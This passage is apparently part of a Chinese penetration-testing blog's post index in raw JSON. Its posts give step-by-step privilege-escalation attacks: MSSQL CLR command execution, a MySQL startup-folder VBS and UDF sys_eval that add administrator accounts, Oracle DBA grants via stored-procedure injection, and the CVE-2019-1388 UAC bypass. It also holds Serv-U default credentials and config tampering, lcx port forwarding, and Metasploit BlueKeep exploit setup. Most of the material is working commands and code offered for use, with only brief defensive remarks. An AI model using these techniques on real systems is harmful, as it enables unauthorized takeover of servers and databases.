System.Collections.Generic;using System.Text;using System.Threading.Tasks;public partial class StoredProcedures{ [Microsoft.SqlServer.Server.SqlProcedure] public static void SqlStoredProcedure1 () { // 在此处放置代码 System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; process.StartInfo.FileName = &quot;cmd.exe&quot;; process.StartInfo.Arguments = &quot;/C whoami &gt; c:\\\\temp\\\\1.txt&quot;; process.Start(); }} 6、填入代码以后进行编译，之后到编译目录下可以看到一个dacpac后缀的文件7、双击此文件进行解压，将解压出一个名为mode.sql的文件。8、执行SQL文件中的以下语句 1234CREATE ASSEMBLY [ExecCode] AUTHORIZATION [dbo] FROM 0x4D5A[...snip...] WITH PERMISSION_SET = UNSAFE; 之后执行： 12CREATE PROCEDURE [dbo].[SqlStoredProcedure1]AS EXTERNAL NAME [ExecCode].[StoredProcedures].[SqlStoredProcedure1] 9、开启数据库服务器配置选项clr enabled 12EXEC sp_configure N'show advanced options', N'1' RECONFIGURE WITH OVERRIDE –开启clr enabled 选项 12EXEC sp_configure N'clr enabled', N'1'RECONFIGURE WITH OVERRIDE –关闭所有服务器配置选项 123EXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE –如果存在权限问题，执行下面一段脚本 12alter database [master] set TRUSTWORTHY onEXEC sp_changedbowner 'sa' 10、执行命令： 1EXEC [dbo].[SqlStoredProcedure1]; 11、删除存储过程 12DROP PROCEDURE [dbo].[SqlStoredProcedure1];DROP ASSEMBLY ExecCode 0x09 参考文章《网络攻防实战研究——漏洞利用与提权》https://www.cnblogs.com/wh4am1/p/11669539.htmlhttps://www.cnblogs.com/xred/archive/2011/12/31/2308724.htmlhttps://www.cnblogs.com/0nc3/p/12071345.html","link":"/2020/09/25/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"},{"title":"Mysql启动项提权","text":"0x00 原理重启服务器会自动调用导入到“ C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动”下的VBS脚本，并执行其中的用户添加及提权命令。 0x01 利用条件两种情况下均可用启动项提权1、C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动 目录可读写直接将 VBS 提权脚本上传到该目录下 2、以root账号登陆MySQL 0x02 提权关键启动目录下的vbs脚本 0x03 提权步骤一、上传VBS提权脚本到启动目录VBS 提权脚本代码如下： 123456789setwsnetwork=CreateObject(“WSCRIPT.NETWORK”)os=”WinNT://”&amp;wsnetwork.ComputerNameSet ob=GetObject(os)Setoe=GetObject(os&amp;”/Administrators,group”)Set od=ob.Create(“user”,”quan”)od.SetPassword “123456”od.SetInfoSet of=GetObject(os&amp;“/quan”,user)oe.add os&amp;“/quan” 二、将数据库表中内容导入到启动目录1、登录mysql2、在test数据库下新建表create table secist(cmd text); 3、插入vbs脚本 123insert into secist values(“set wshshell=createobject(“”wscript.shell””)”);insert into secist values(“a=wshshell.run(“”cmd.exe /c net user quan 123456 /add“”,0)”);insert into secist values(“b=wshshell.run(“”cmd.exe /c net localgroup administrators quan /add“”,0)”); 4、导出vbs脚本到启动选项 1select * from secist into dumpfile “C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\quan.vbs”; 5、利用其他手段使服务器重启后就提权成功了 0x04 参考https://www.cnblogs.com/wh4am1/p/6613759.html《网络攻防实战研究——漏洞利用与提权》5.7.2 https://www.cnblogs.com/0nc3/p/12071340.html","link":"/2020/09/24/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/Mysql%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83/"},{"title":"Oracle数据库提权","text":"0x00 Oracle提权基础1、Oracle权限分配1.1 系统权限系统规定用户使用数据库的权限。（系统权限是对用户而言)。 系统权限分类DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。对于普通用户：授予connect, resource权限。对于DBA管理用户：授予connect，resource, dba权限。 1.2 实体权限某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）。 实体权限分类select, update, insert, alter, index, delete, all //all包括所有权限execute //执行存储过程权限 0x01 Oracle提权方法1、通过注入存储过程提权（低权限提升至DBA）1.1 原理SYS创建的存储过程存在sql注入。拥有create procedure权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行grant dba to quan命令，获得Oracle数据库dba权限。 1.2 利用条件1、SYS创建的存储过程存在sql注入（EG：CVE-2005-4832） 2、用户拥有create procedure权限（用来创建函数） 1.3 提权步骤假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限 1.3.1 手工注入 （1）用户登陆后执行select * from session_privs查看权限 （2）创建函数，命令为grant dba to quan grant execute on pwn to public;//赋予所有用户此函数的执行权限 12345678910SQL&gt;create or replace function pwn return vaarchar2authid current_user is pragma autonomous_transaction;beginexecute immediate 'grant dba to quan';return '';end;/SQL&gt;grant execute on pwn to public;/ （3）注入sys.dbms_cdc_subscribe.activate_subscription 123456SQL&gt;beginsys.dbms_cdc_subscribe.activate_subscription('''||quan.pwn()||''');end;/SQL&gt;set role dba; （4）执行select * from session_privs查看是否为dba权限 1.3.2 利用MSF注入 （1）加载攻击模块 1use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription （2）配置参数 123456789set dbuser quanset dbpass quan123set sid orclset rhost xxxxxset sql grant dba to quan （3）run 2、通过utl_http.request存储过程提权2.1 原理Oracle9i~11gR2中dbms_xmlquery.newcontext()和dbms_xmlquery.getxml()函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的操作系统权限。 2.2 利用条件1、UTL_HTTP存储过程可用 2、Oracle9i~11gR2 2.3 提权步骤（1）创建Java包 （2）创建存储过程MYJAVACMD （3）执行存储过程，成功添加用户 0x02 参考文章《网络攻防实战研究——漏洞利用与提权》 转自：https://www.cnblogs.com/0nc3/p/12081189.html","link":"/2020/09/26/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"},{"title":"UDF提权","text":"0x01-udf是什么？udf = ‘user defined function’，即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就象使用本地MYSQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于‘mysql/lib/plugin’目录下，文件后缀为‘.dll’，常用c语言编写。 通过在udf文件中定义新函数，对MYSQL的功能进行扩充，可以执行系统任意命令，将MYSQL账号root转化为系统system权限。 那么如何使用udf呢？ 0x02-如何使用udf?假设我的udf文件名为‘udf.dll’，存放在Mysql根目录(通过select @@basedir可知)的‘lib/plugin’目录下。在udf中，我定义了名为sys_eval的mysql函数，可以执行系统任意命令。如果我现在就打开mysql命令行，使用select sys_eval(‘dir’);的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把‘udf.dll’放到了某个文件夹里，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。所以，我们应该把‘udf.dll’中的自定义函数引入进来。看一下官方文档中的语法： 不要慌，看看实例用法： 1CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; 只有两个变量，一个是function_name（函数名），我们想引入的函数是sys_eval。还有一个变量是shared_library_name（共享包名称），即‘udf.dll’。至此我们已经引入了sys_eval函数，下面就是使用了。这个函数用于执行系统命令，用法如下： 1select sys_eval('cmd command'); 0x03-使用udf提权现在我们已经知道了udf是什么，以及如何引入udf。下面我们要关注的就是提权了。其实到这里，提权已经结束了，因为对于sys_eval()函数，其中的指令是直接以管理员的权限运行的，所以这也就是最高权限了。下面来整理一下思路： 将udf文件放到指定位置 从udf文件中引入自定义函数(user defined function) 执行自定义函数 注意： mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\\plugin文件夹下 mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\\windows\\system32目录，在windows server 2000下放置在c:\\winnt\\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。拥有可以将udf.dll写入相应目录的权限。 环境： 本机os: win10 靶机os: win7 php: 5.4.45 mysql: 5.5 1、本地mysql将udf.dll转换为16进制先看第一步，拿到一个网站的webshell之后，在指定位置创建udf文件。如何创建？先别忘了，现在连源udf文件都没有。sqlmap中有现成的udf文件，分为32位和64位，一定要选择对版本，否则会显示：Can’t open shared library ‘udf.dll’。获取sqlmap的udf请看链接：MySQL 利用UDF执行命令 然后将获得的udf.dll文件转换成16进制，一种思路是在本地使用mysql函数hex： 12SELECT hex(load_file(0x433a5c5c55736572735c5c6b61316e34745c5c4465736b746f705c5c6c69625f6d7973716c7564665f7379732e646c6c)) into dumpfile 'C:\\\\Users\\\\ka1n4t\\\\Desktop\\\\gg.txt';load_file中的十六进制是C:\\\\Users\\\\ka1n4t\\\\Desktop\\\\lib_mysqludf_sys.dll 此时gg.txt文件的内容就是udf文件的16进制形式。 接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。 2、将16进制的udf.dll导入到目标机12341. CREATE TABLE udftmp (c blob); //新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。2. INSERT INTO udftmp values(unhex('udf文件的16进制格式')); //在udftmp中写入udf文件内容3. SELECT c FROM udftmp INTO DUMPFILE 'H:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll'; //将udf文件内容传入新建的udf文件中，路径根据自己的@@basedir修改//对于mysql小于5.1的，导出目录为C:\\Windows\\或C:\\Windows\\System32\\ 上面第3步，mysql5.1以上的版本是默认没有plugin目录的，网上有说可以使用ntfs数据流创建： 即：利用NTFS ADS创建lib目录 1Copyselect test into dumpfile 'H:\\\\PHPStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION'; 但是我本地测试一直没有成功。后来又在网上看了很多，都是用这种方法，看来是无解了。在t00ls上也有人说数据流从来没有成功过，所以说mysql5.1以上的提权能否成功还是个迷。为了演示，在这里我是手工创建了个plugin目录(ps: 勿喷啦，我用的phpstudy环境，重新安装一个mysql的话有可能会冲突，所以就没搞，毕竟原理都一样)。 继续，到这儿如果没有报错的话就说明已经在目标主机上成功生成了udf文件。 3、创建udl自定义函数下面要导入udf函数： 121. DROP TABLE udftmp; //为了删除痕迹，把刚刚新建的udftmp表删掉2. CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; //导入udf函数 4、执行自定义函数导入成功的话就可以使用了： 12SELECT sys_eval('ipconfig');返回网卡信息 附几个常用的cmd指令，用于添加一个管理员用户： 12net user ka1n4t ka1n4t~!@ /add //添加新用户：ka1n4t，密码为ka1n4t~!@net localgroup administrators ka1n4t /add //将ka1n4t添加至管理员分组 0x04 SQLmap利用自动化注入工具Sqlmap已经集成了此功能。 在 sqlmap\\udf\\mysql\\windows\\32目录下存放着lib_mysqludf_sys.dll_ （sqlmap\\udf\\mysql\\windows\\64目录下为64位的lib_mysqludf_sys.dll_，但是64位的测试失败） 但是sqlmap 中 自带 的shell 以及一些二进制文件，为了防止被误杀都经过异或方式编码，不能直接使用的。 可以利用sqlmap 自带的解码工具cloak.py目录 sqlmap\\extra\\cloak\\cloak.py 对 sqlmap\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_ 解码后，再直接利用。 首先进入到 sqlmap\\extra\\cloak\\cloak 目录下，执行命令： 1cloak.py -d -i D:\\sqlmap\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_ 在 D:\\sqlmap\\udf\\mysql\\windows\\32\\lib_mysqludf_sys.dll_会生成 lib_mysqludf_sys.dll 攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。 函数： sys_eval，执行任意命令，并将输出返回。 sys_exec，执行任意命令，并将退出码返回。 sys_get，获取一个环境变量。 sys_set，创建或修改一个环境变量。 目标机以windows为例，MySQL版本为5.6 攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。 然后，创建UDF。 lib_mysqludf_sys.dll的导出路径： MySQL&lt;5.0，导出路径随意； 5.0 &lt;= MySQL&lt;5.1，则需要导出至目标服务器的系统目录（如：system32） MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\\plugin文件夹下才能创建自定义函数。 创建相应的函数： create function sys_eval returns string soname ‘udf.dll’; 执行命令： select sys_eval(‘whoami’); select sys_eval(‘net user fvck fvck /add’);select sys_eval(‘net localgroup administrators fvck /add’); https://www.cnblogs.com/litlife/p/9030673.html https://blog.csdn.net/x728999452/article/details/52413974","link":"/2020/08/04/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/UDF%E6%8F%90%E6%9D%83/"},{"title":"Windows UAC提权（CVE-2019-1388）","text":"0x00 UAC简介首先来理解一下什么是 UAC ： 用户账户控制UAC：UAC 是 win10 操作系统中非常重要的安全功能，它起源于 windows vista 操作系统，流行于 windows7、windows8 。各种功能策略得到了完善的修订和开发，应用在 win10 操作系统中，目的是减少恶意软件对系统的侵害。 操作系统默认情况下是启用UAC，当用户运行软件就会触发UAC规则。执行的时候就需要权限，否则是不会运行的。 不涉及到更改计算机操作的项目是不会触发UAC规则的，能够触发UAC规则的常用操作包括以下内容： 123456Copy运行应用程序修改注册表文件安装或者卸载程序安装设备驱动程序增加或者删除用户账户复制文件到windows目录 用户操作以上内容时就会触发UAC规则，系统会弹出提示对话框。简单来说，弹出对话框操作就是临时提升用户权限，允许程序运行。 控制 UAC 的4种级别: 1、始终通知（最高级别）在最高级别中，用户安装和卸载应用程序、更改系统设置等操作时，都会触发UAC并弹出提示框。此级别是系统的最高安全级别，禁止用户随意更改设置和卸载应用程序等操作。 2、仅在程序尝试对我的计算机进行更改时通知我（默认级别）在这个级别下，只有应用程序操作时会触发UAC规则，用户对电脑的其它设置操作不会触发UAC。所以，在此规则下既不影响用户的正常操作，又可以防止恶意软件对电脑的更改。 3、仅当程序尝试更改计算机时通知我默认情况下，如果用户需要对操作系统进行更改设置，触发了UAC也不会对系统造成问题。但是，当你没有运行任何程序的时候，电脑提示触发UAC的提示框，说明某些恶意程序正在对电脑进行更改操作。我们应该立刻阻止操作。 4、从不通知（最低级别）运行在最低级别时，当使用管理员用户或者普通用户操作系统时，所有的操作都会默认执行，电脑不会有任何的提示。在此模式下工作，电脑系统处于不安全的状态。木马程序可以随意更改电脑内部的数据，也可以在用户不只知道的情况下对电脑做出更改。 0x01 漏洞简介该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示 Secure Desktop。 这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以NT AUTHORITY\\SYSTEM权限运行，完整性级别为System。 因为用户可以与该UI交互，因此对UI来说：限制是必须的，否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作，即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。 事实上，UAC会话中本应该尽可能含有少些点击操作选项，倘若利用该漏洞，是很容易就可以提升权限到SYSTEM。 0x02 影响范围12345678910111213Copy#SERVER Windows 2008r2 7601 ** link OPENED AS SYSTEM ** Windows 2012r2 9600 ** link OPENED AS SYSTEM ** Windows 2016 14393 ** link OPENED AS SYSTEM ** Windows 2019 17763 link NOT opened Copy#WORKSTATION Windows 7 SP1 7601 ** link OPENED AS SYSTEM ** Windows 8 9200 ** link OPENED AS SYSTEM ** Windows 8.1 9600 ** link OPENED AS SYSTEM ** Windows 10 1511 10240 ** link OPENED AS SYSTEM ** Windows 10 1607 14393 ** link OPENED AS SYSTEM ** Windows 10 1703 15063 link NOT opened Windows 10 1709 16299 link NOT opened 0x03 漏洞复现环境信息：Windows 7 sp1 触发UAC的程序：HHUPD.EXEhttps://github.com/jas502n/CVE-2019-1388 实验前： 开始实验：1.以管理员权限运行 HHUPD.EXE，显示详细信息，显示有关此发布者的证书信息 2.点击颁发者右侧的超链接，等待一段时间ie浏览器自动运行，并访问该链接，这时出现404或链接无法访问（此时浏览器以system权限运行) Copy 3.将该网页直接另存为文件，选择位置C:\\Windows\\System32\\*.* 4.选择 cmd.exe 并运行，此时查看权限，已经是system权限 0x04 参考链接CVE-2019-1388： Windows UAC 提权https://github.com/jas502n/CVE-2019-1388https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege","link":"/2020/09/26/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/Windows-UAC%E6%8F%90%E6%9D%83%EF%BC%88CVE-2019-1388%EF%BC%89/"},{"title":"提权分类","text":"0x00 提权技术分类大概分为三种:1.系统溢出漏洞提权2.数据库提权3.第三方软件提权 0x01 通常脚本所处的权限1.asp / php 匿名权限(网络服务权限)2.aspx user权限3.jsp 通常是系统权限 0x02 提权前的准备1234567• 服务器的操作系统• 操作系统位数情况• 当前计算机用户权限• 当前计算机补丁情况• 当前计算机进程情况• 当前网站支持的脚本类型• 找可读可写目录，上传提权exp，调用cmd执行exp进行提权 常用命令：（1）Whoami 查看当前用户权限（2）Systeminfo 查看计算机的信息（操作系统，位数，补丁情况等）（3） Net user 查看计算机的用户（4）tasklist/svc 查看正在运行的服务（5）netstat -ano 查看开放的所有端口（6）wmic qfe get Description,HotFixID,InstalledOn | findstr /C:”KB4013389” /C:”KB958644” 查看补丁信息 0x03 Windows下提权方式一、本地提权1.溢出提权（1） 远程溢出远程溢出提权是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用响应的溢出程序，即可获取到远程服务器的root权限。攻击者在攻击服务器时，使用远程溢出这种溢出攻击这种攻击手段是比较少的，服务器通常都打了漏洞补丁，这样旧的溢出漏洞一般不会再起作用，而新的溢出漏洞少之又少，可以说远程溢出漏洞已经”日落西山”了。（2）本地溢出本地溢出提权首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限。EXP = Exploit的中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。2.Getpass 提权3.hash传递入侵4.lpk提权 二、数据库提权1. Mysql提权• udf提权• 启动项提权• mof提权 2. SQL Server提权• 利用xp_cmdshell提权• sp_oacreate进行提权• 沙盒进行提权• 利用SQL Server CLR提权3. Oracle提权• 虚拟主机提权• 星外提权• 西部数码提权• 华众虚拟主机提权 三、第三方软件提权1.FTP提权• serv-u提权• G6-FTP提权• FileZilla提权• FlashFXP提权• PcAnywhere提权• Xlight FTP Server提权 2.远程软件提权• vnc• radmin 3.其他• Magic Winmail提权• navicat提权• zend• 搜狗输入法提权• PR提权详解• 巴西烤肉提权• 利用360提权 0x04 参考https://www.cnblogs.com/wh4am1/p/11669539.htmlhttps://blog.csdn.net/God_XiangYu/article/details/99843265#","link":"/2020/09/24/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/%E6%8F%90%E6%9D%83%E5%88%86%E7%B1%BB/"},{"title":"第三方软件ser-u提权","text":"0x00 serv-u简介 Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等 Serv-u服务具有多个用户 serv-u默认安装目录:C:\\Program Files\\rhinosoft.com\\serv-U serv-u密码文件：ServUDaemon.ini 端口号：默认端口是43958ServUDaemon.ini中localsetuportNo=端口 SerUDaemon.ini中修改密码默认重启服务生效，如果想要立即生效，需要在[GLOBAL]字段部分添加ReloadSetting=True，这个语句在Serv-u重新载入ServUDaemon.ini的内容后会自动消失 serv-u默认管理账号是LocalAdministrator,默认密码是”#l@$ak#.lk;0@P“ 0x01 FTP提权方法1、有修改权限2、无权限修改3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)4、serv-u ftp转发端口0x02 有修改权限步骤如下： 1、判断是否安装serv-unmap扫端口确认 2、检查是否有可写权限一般安装目录 c:\\Program Files\\Serv-u\\SerUDaemon.ini 3、在serv-u中添加用户在user4=添加一个系统用户 12345678910[USER=quan|1] //用户名Password= //用户密码加密后的密文HomeDir=c:\\ftp\\quan //目录RelPaths=3 TimeOut=600 //超时时间设置Maintenance=System //权限Access1=C:\\|RWAMELCDP //可访问的目录及权限Access2=d:\\|RWAMELCDP //可访问的目录及权限Access3=e:\\|RWAMELCDP //可访问的目录及权限SKEYValues= 加密规则 password=2位随机字符+md5(2位随机字符+123456) 举例： 1234567891011[USER=spiger|1] //用户名Password=sbd8b58b5c201ee5cc20f9a8551197d4a5 //用户密码加密后的密文HomeDir=c:\\ftp\\seven //目录RelPaths=3 TimeOut=600 //超时时间设置Maintenance=System //权限Access1=C:\\|RWAMELCDP //可访问的目录及权限Access2=d:\\|RWAMELCDP //可访问的目录及权限Access3=e:\\|RWAMELCDP //可访问的目录及权限SKEYValues= 注解：斜杠为理解之用，并非也要予以添加添加上述代码并保存后，就会在serv-u中添加用户名为spiger，密码是123456。 其中pasword字段中：sb+MD5(sb123456) ，其中sb为随机字符 Access1=C:|RWAMELCDP（这个代表所有权限，包括可执行） maintenance=system 是代表系统权限 user=你命名的用户 4、连接目标FTP服务器1ftp 目标IP地址 刚添加的用户密码 5、利用ftp命令quote site exec添加用户加入administrators权限组12quote site exec net user quan quan123 /addquote site exec net localgroup administrators quan /add 0x03 无修改权限1、利用md5 直接去解密2、默认用户名密码账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P命令：cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add 3、不是默认密码时直接把受害机的SerUAdmin.exe 下载下来用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码 实操： 通过c32hex进行查看，搜索LocalAdministrator字段， .后面就是密码 serv-u7中管理员的口令在C:\\Program Files\\RhinoSoft.com\\Serv-U\\Users\\Local Administrator Domain.Archive文件中，破解方法和serv-u6是一样的 0x04 serv-u ftp本地溢出权限提升(使用6.0以及以前版本)步骤如下： 1、用Serv-U提权综合工具生成提权工具serv_u.exe2、先上传 serv_u.exe 到一个盘符下比如是d盘 3、执行命令123d:\\serv_u.exed:\\serv_u.exe “net user quan quan123 /add”d:\\serv_u.exe “net localgroup administrators quan /add” 注意命令要有引号 0x05 serv-u ftp转发端口1、lcx端口转发在目标Webshell上运行LCX命令 1lcx -slave yourIP 5000 127.0.0.1 43958 在本机上运行 1lcx -listen 5000 21 2、本机登陆Serv_U打开本地的SERV_U 在IP上填入127.0.0.1帐号写LocalAdministrator 密码#l@$ak#.lk;0@P 0x06webshell+serv-u实操倘若口令更改了大家可以去serv-u的目录（默认路径：C:\\Program Files\\Serv-U\\）找其配置文件（ServUDaemon.ini），在配置文件中有其密码。 webshell里默认的执行。如下操作： 0x07防御方法1.确保serv-u安装路径只有系统用户访问权限2.确保建立的ftp账号不要给执行权限3.修改ftp默认监听端口 0x08m 参考https://blog.csdn.net/God_XiangYu/article/details/99692269https://www.cnblogs.com/feizianquan/p/10891352.htmlhttps://www.cnblogs.com/0nc3/p/12097070.htmlhttps://www.cnblogs.com/xishaonian/p/6253115.html","link":"/2020/09/24/web%E6%B8%97%E9%80%8F/0.%E6%8F%90%E6%9D%83/%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6ser-u%E6%8F%90%E6%9D%83/"},{"title":"CVE_2019_0708","text":"0x01 漏洞描述 ​ Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广如：windows2003、windows2008、windows2008 R2、windows xp系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。2019年9月7日晚上凌晨1点左右，metaspolit更新了漏洞利用程序 ​ 在2019年5月，微软发布了针对远程代码执行漏洞CVE-2019-0708的补丁更新，该漏洞也称为“BlueKeep”，漏洞存在于远程桌面服务（RDS）的代码中。此漏洞是预身份验证，无需用户交互，因此具有潜在武器化蠕虫性性漏洞利用的危险。如果成功利用此漏洞，则可以使用“系统”权限执行任意代码。Microsoft安全响应中心的建议表明这个漏洞也可能会成为一种蠕虫攻击行为，类似于Wannacry和EsteemAudit等攻击行为。由于此漏洞的严重性及其对用户的潜在影响，微软采取了罕见的预警步骤，为不再受支持的Windows XP操作系统发布补丁，以保护Windows用户。 0x02 漏洞影响​ 该漏洞影响旧版本的Windows系统，包括：Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP。Windows 8和Windows 10及之后版本不受此漏洞影响。 0x03 漏洞复现1、测试环境msf版本metasploit v5.0.47-dev-9a6830c0adc0f5afa9bf144375ea8e016af7adbd 靶机： win7 sp1 7601 和 win2008r2 sp1 english standard Windows7 SP1下载地址: ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ win2008r2 sp1 下载地址： http://download.microsoft.com/download/7/5/E/75EC4E54-5B02-42D6-8879-D8D3A25FBEF7/7601.17514.101119-1850_x64fre_server_eval_en-us-GRMSXEVAL_EN_DVD.iso Exp下载： 1234567wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 移动到exp到msf中（mac为例） 找到对应的msf路径中 1234567cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploitsudo cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp 移动exp到msf中（kali） 123456789cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/ cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/ cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/ （如果提示rdp目录不存在，自己新建一个就可以了，顺便给个chmod +x权限就行） cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/ 2、攻击 windows7 sp1漏洞复现msfconsole msf5&gt;reload_all. #重新加载所有模块 msf5&gt;search 0708 msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options 其中Required为yes的为必须设置项 看到必须设置rhosts 和 rport 查看到靶机ip为192.168.1.111 msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.1.111 msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 1 msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run 未知原因，试了好几个靶机，都没办法复现成功。 据说有人用这个靶机复现成功了： ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 3、复现关键点1、开启3389，关闭防火墙 2、四个target，0代表自动根据指纹自动判断情况（亲测不好用），1代表真实机器，2代表目标系统在virtualbox虚拟机下运行，3代表目标系统在VMWare虚拟机下运行，4代表目标系统在Hyper-V虚拟机下运行。 3、在拿到shell以后显示乱码 原因是linux编码为utf8，而windows是gbk编码，两者统一就行了。 修改为utf8则执行 chcp 65001 4、提示ForceExploit错误 你需要将ForceExploit设置为true msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set forceexploit true 5、在打2008的时候需要在注册表中修改[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\WinStations\\rdpwd\\fDisableCam]值修改为0，但是打了也还是蓝屏。#成功率也很低，蓝屏率特别高。 6、看了网上很多人的文章，也都是说打的蓝屏。总的来说，这个漏洞的质量并没有MS17_010永恒之蓝的高，没打成就变成蓝屏了。而且利用起来貌似限制蛮多的。单核服务器上成功率约90%, 双核上 40-60%, 四核上10%，如果失败，目标系统会蓝屏。 0x04 漏洞修复补丁以及安全意见有些windows 2008系统打不了补丁的一般是数据中心版本，可以设置一下服务器，计算机右键属性-远程设置-仅允许运行使用网络基本身份验证的远程桌面的计算机连接（更安全）（N），在这行点勾，然后确认即可，可以临时的防止漏洞的攻击。 如果对补丁不知道该如何修复的，可以启用阿里云的端口安全策略，禁止掉3389远程端口，只允许自己的IP通信即可。 1.Windows Server 2008 漏洞补丁系列下载地址Windows Server 2008 32位系统: 